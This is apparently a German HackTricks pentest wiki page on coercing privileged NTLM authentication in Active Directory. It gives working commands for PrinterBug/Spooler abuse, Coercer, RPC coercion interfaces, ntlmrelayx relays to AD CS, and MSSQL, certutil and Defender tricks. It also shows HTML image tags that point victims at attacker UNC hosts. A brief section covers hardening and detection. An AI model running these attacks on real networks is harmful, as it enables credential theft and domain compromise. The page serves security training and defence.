# Erzwingen privilegierter NTLM-Authentifizierung

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ist eine **Sammlung** von **remote authentication triggers**, die in C# mithilfe des MIDL-Compilers entwickelt wurde, um Abhängigkeiten von Drittanbietern zu vermeiden.

## Spooler Service Abuse

Wenn der _**Print Spooler**_-Dienst **aktiviert** ist, kannst du bereits bekannte AD-Credentials verwenden, um den Printserver des Domain Controllers aufzufordern, eine **Aktualisierung** zu neuen Druckaufträgen anzufordern und ihm einfach mitzuteilen, die Benachrichtigung an ein bestimmtes System **zu senden**.\
Beachte, dass der Drucker beim Senden der Benachrichtigung an beliebige Systeme sich gegenüber diesem **System authentifizieren** muss. Daher kann ein Angreifer den _**Print Spooler**_-Dienst dazu bringen, sich gegenüber einem beliebigen System zu authentifizieren, wobei der Dienst bei dieser Authentifizierung das **Computerkonto** verwendet.

Unter der Haube missbraucht das klassische **PrinterBug**-Primitive **`RpcRemoteFindFirstPrinterChangeNotificationEx`** über **`\\PIPE\\spoolss`**. Der Angreifer öffnet zunächst ein Drucker-/Server-Handle und übergibt dann einen gefälschten Clientnamen in `pszLocalMachine`, sodass der Ziel-Spooler einen Benachrichtigungskanal **zum vom Angreifer kontrollierten Host zurück** erstellt. Deshalb handelt es sich um **outbound authentication coercion** und nicht um direkte Codeausführung.<sup>[[2]](#references)</sup>\
Wenn du nach **RCE/LPE** im Spooler selbst suchst, sieh dir [PrintNightmare](printnightmare.md) an. Diese Seite konzentriert sich auf **coercion und relay**.

### Windows-Server in der Domäne finden

Verwende PowerShell, um Windows-Hosts aufzulisten. Server sind normalerweise die Ziele mit der höchsten Priorität, konzentriere dich daher zuerst auf sie:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Nach lauschenden Spooler-Diensten suchen

Verwende den leicht modifizierten [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) von @mysmartlogin (Vincent Le Toux), um zu prüfen, ob der Spooler Service lauscht:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Du kannst unter Linux auch `rpcdump.py` verwenden und nach dem **MS-RPRN**-Protokoll suchen:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Oder teste Hosts schnell von Linux aus mit **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Wenn du **Coercion-Oberflächen enumerieren** möchtest, statt nur zu prüfen, ob der Spooler-Endpunkt existiert, verwende den **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Dies ist nützlich, da das Anzeigen des Endpunkts in EPM lediglich bedeutet, dass die Print-RPC-Schnittstelle registriert ist. Es **garantiert nicht**, dass jede Coercion-Methode mit Ihren aktuellen Berechtigungen erreichbar ist oder dass der Host einen nutzbaren Authentifizierungsablauf auslöst.

### Den Dienst auffordern, sich bei einem beliebigen Host zu authentifizieren

Sie können [SpoolSample von hier](https://github.com/NotMedic/NetNTLMtoSilverTicket) kompilieren.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
oder [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) oder [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), wenn du Linux verwendest
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Mit **Coercer** kannst du die Spooler-Schnittstellen direkt ansprechen und musst nicht raten, welche RPC-Methode verfügbar ist:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Moderne RPC-over-TCP-Callbacks

Gehe nicht davon aus, dass ein erfolgreicher Aufruf von `RpcRemoteFindFirstPrinterChangeNotificationEx` zwingend Datenverkehr über TCP/445 erzeugen muss. **Windows 11 22H2 und höher verwenden standardmäßig RPC über TCP für die Druckkommunikation**; RPC über Named Pipes ist deaktiviert, sofern es nicht durch eine Richtlinie oder `RpcUseNamedPipeProtocol=1` wieder aktiviert wird. Daher können ältere, ausschließlich auf SMB ausgelegte Listener melden, dass der Trigger gesendet wurde, ohne jemals den Callback zu empfangen. Microsoft dokumentiert TCP/135 (Endpoint Mapper) sowie dynamische RPC-Ports für normale Druck-RPCs. Unternehmen können diesen Bereich einschränken oder einen festen Druck-RPC-Port auswählen.<sup>[[10]](#references)</sup>

Das aktuelle **Impacket `ntlmrelayx.py`** enthält einen RPC-Relay-Server und einen kleinen Endpoint Mapper, der standardmäßig auf TCP/135 aktiviert ist. Diese Unterstützung wurde im Juni 2025 speziell zusammen mit einer demonstrierten PrinterBug-to-AD-CS-Kette integriert. Dadurch kann der authentifizierte RPC-Callback weitergeleitet werden, selbst wenn das Zielsystem nicht auf SMB/WebDAV zurückfällt.<sup>[[11]](#references)</sup>
```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Suche in der Relay-Ausgabe nach `Setting up RPC Server on port 135` und `RPCD: Received connection`. Wenn der RPC-Aufruf einen erwarteten Fehler zurückgibt, aber nichts den Listener erreicht, überprüfe die Print-RPC-Transport-Policy des Opfers, die ausgehende Filterung, die DNS-Auflösung und ob bereits ein anderer Prozess TCP/135 verwendet. Stelle außerdem sicher, dass `ntlmrelayx` nicht mit `--no-rpc-server` gestartet wurde.

### HTTP anstelle von SMB mit WebClient erzwingen

Auf Systemen, die weiterhin **RPC over named pipes** verwenden (Legacy-Builds oder durch Richtlinien wiederhergestelltes Verhalten), führt der klassische PrinterBug normalerweise zu einer **SMB**-Authentifizierung bei `\\attacker\share`, die weiterhin für **capture**, **relay to HTTP targets** oder **relay where SMB signing is absent** nützlich ist.\
Das Relaying von **SMB to SMB** wird jedoch häufig durch **SMB signing** blockiert. Daher bevorzugen Operatoren möglicherweise, stattdessen eine **HTTP/WebDAV**-Authentifizierung zu erzwingen. Dies ist kein Fallback für das oben beschriebene RPC-over-TCP-Verhalten.

Wenn auf dem Ziel der Dienst **WebClient** läuft, kann der Listener in einer Form angegeben werden, die Windows dazu bringt, **WebDAV over HTTP** zu verwenden:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Dies ist besonders nützlich in Kombination mit **`ntlmrelayx --adcs`** oder anderen HTTP relay targets, da dadurch vermieden wird, sich auf die SMB relayability der erzwungenen Verbindung zu verlassen. Der wichtige Hinweis ist, dass **WebClient auf dem Opfer ausgeführt werden muss**, damit die HTTP/WebDAV-Variante funktioniert.

### Kombination mit Unconstrained Delegation

Wenn ein Angreifer einen Computer kompromittiert hat, der für [Unconstrained Delegation](unconstrained-delegation.md) konfiguriert ist, kann er **den Drucker dazu zwingen, sich bei diesem Computer zu authentifizieren**. Das **TGT** des Drucker-Computerkontos wird anschließend im Arbeitsspeicher des Unconstrained-Delegation-Hosts zwischengespeichert, wo der Angreifer es abrufen und mit [Pass the Ticket](pass-the-ticket.md) wiederverwenden kann.

### Hinweise zu Erkennung und Hardening

Die zuverlässigste Möglichkeit, PrinterBug auf einem DC, PAW oder Server, der nicht druckt, zu entfernen, besteht darin, den Spooler zu beenden und zu deaktivieren. Wenn Drucken erforderlich ist, sollte jedes mögliche relay target gehärtet werden (SMB server signing, LDAP signing/channel binding und EPA auf HTTP-Diensten wie AD CS), anstatt davon auszugehen, dass das Blockieren von TCP/445 auf dem Callback-Pfad ausreichend ist.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
Die Erkennung sollte einen authentifizierten Aufruf an die MS-RPRN-UUID `12345678-1234-abcd-ef00-0123456789ab` korrelieren, insbesondere Opnum 62/65 mit einem nicht-lokalen Callback-Wert sowie einer unmittelbar darauf folgenden ausgehenden SMB-, HTTP- oder RPC-Verbindung vom Spooler-Host. Eine Baseline für **Interface-UUID/Opnum sowie Quell-/Zielpaare** erstellen, nicht nur für den Zugriff auf `\PIPE\spoolss`, da aktuelle Print-Stacks den Callback über RPC-over-TCP absetzen können.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-Pfad-Coercion-Matrix (Interfaces/Opnums, die ausgehende Authentifizierung auslösen)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Hinweise: asynchrones Print-Interface auf derselben Spooler-Pipe; Coercer verwenden, um erreichbare Methoden auf einem bestimmten Host aufzulisten<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (auch über \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Häufig missbrauchte Opnums: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Hinweis: Diese Methoden akzeptieren Parameter, die einen UNC-Pfad enthalten können (z. B. `\\attacker\share`). Bei ihrer Verarbeitung authentifiziert sich Windows (im Kontext des Computers/Benutzers) bei diesem UNC-Pfad, wodurch die Erfassung oder das Relay von NetNTLM ermöglicht wird.\
Für Spooler-Missbrauch bleibt **MS-RPRN Opnum 65** das häufigste und am besten dokumentierte Primitive, da die Protokollspezifikation ausdrücklich angibt, dass der Server einen Benachrichtigungskanal zurück zum durch `pszLocalMachine` angegebenen Client erstellt.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (Opnum 9) Coercion
- Interface: MS-EVEN über \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Aufrufsignatur: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effekt: Das Ziel versucht, den angegebenen Pfad für das Backup-Log zu öffnen, und authentifiziert sich beim vom Angreifer kontrollierten UNC-Pfad.<sup>[[1]](#references)</sup>
- Praktische Verwendung: Tier-0-Assets (DC/RODC/Citrix usw.) dazu zwingen, NetNTLM auszugeben, und anschließend ein Relay an AD-CS-Endpunkte (ESC8/ESC11-Szenarien) oder andere privilegierte Services durchführen.<sup>[[1]](#references)</sup>

## PrivExchange

Der `PrivExchange`-Angriff ist das Ergebnis einer Schwachstelle im **Exchange-Server-Feature `PushSubscription`**. Dieses Feature ermöglicht es jedem Domainbenutzer mit einem Postfach, den Exchange-Server dazu zu zwingen, sich über HTTP bei einem beliebigen vom Client bereitgestellten Host zu authentifizieren.

Standardmäßig läuft der **Exchange-Service als SYSTEM** und verfügt über übermäßige Berechtigungen (insbesondere über **WriteDacl-Rechte bei der Domain vor dem Cumulative Update 2019**). Diese Schwachstelle kann ausgenutzt werden, um das **Relay von Informationen an LDAP zu ermöglichen und anschließend die NTDS-Datenbank der Domain zu extrahieren**. Wenn ein Relay an LDAP nicht möglich ist, kann diese Schwachstelle weiterhin verwendet werden, um ein Relay durchzuführen und sich bei anderen Hosts innerhalb der Domain zu authentifizieren. Die erfolgreiche Ausnutzung dieses Angriffs gewährt mit jedem authentifizierten Domainbenutzerkonto sofortigen Zugriff auf den Domain Admin.

## In Windows

Wenn du dich bereits innerhalb des Windows-Computers befindest, kannst du Windows mit privilegierten Konten dazu zwingen, eine Verbindung zu einem Server herzustellen:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Oder verwenden Sie diese andere Technik: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es ist möglich, den Certutil.exe-Lolbin (von Microsoft signierte Binärdatei) zu verwenden, um eine NTLM-Authentifizierung zu erzwingen:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Per E-Mail

Wenn du die **E-Mail-Adresse** des Benutzers kennst, der sich an einer Maschine anmeldet, die du kompromittieren möchtest, könntest du ihm einfach eine **E-Mail mit einem 1x1-Bild** senden, wie etwa
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Wenn das Opfer die Datei öffnet, versucht Windows, sich zu authentifizieren.

### MitM

Wenn du einen MitM-Angriff durchführen und HTML in eine vom Opfer angezeigte Seite einschleusen kannst, versuche, ein Bild wie das folgende einzuschleusen:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Andere Möglichkeiten, NTLM-Authentifizierung zu erzwingen und zu phishen


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 knacken

Wenn du [NTLMv1-Challenges erfassen kannst, lies hier, wie du sie knackst](../ntlm/index.html#ntlmv1-attack).\
_Denke daran, dass du zum Knacken von NTLMv1 die Responder-Challenge auf „1122334455667788“ setzen musst._

## References

- [1] [Unit 42 – Die Erzwingung von Authentifizierung entwickelt sich ständig weiter](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog-Remoting-Protokoll](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – RPC-Verbindungsaktualisierungen für das Drucken in Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – RPC-Relay-Server und Endpoint Mapper für ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
{{#include ../../banners/hacktricks-training.md}}
